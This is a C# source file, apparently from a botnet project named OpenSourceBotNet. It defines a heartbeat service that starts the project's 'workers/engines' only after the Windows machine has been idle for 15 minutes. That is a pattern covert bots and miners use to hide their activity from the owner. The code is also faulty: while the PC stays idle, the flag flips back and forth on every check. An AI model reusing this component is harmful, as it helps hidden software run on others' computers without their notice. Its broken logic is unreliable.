using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using OpenSourceBotNet;
using OpenSourceBotNet.Core;
using OpenSourceBotNet.Core.Helpers;

namespace OpenSourceBotNet.Services.Heartbeats
{
    public class IdleCheck : FluxService
    {
        public IdleCheck()
        {
            pause = 30000;
        }

        public override void HeartBeat()
        {
            uint idleTime = conSweetDreams.Utils.Win32.GetIdleTime();
            if (idleTime > 900000 && FluxGlobal.bWorkable == false)
            {
                // Start When PC Idle Workers/Engines
                FluxGlobal.bWorkable = true;
            }
            else
            {
                // Stop Engine in doing so stopping all workers
                FluxGlobal.bWorkable = false;
            }
        }
    }
}
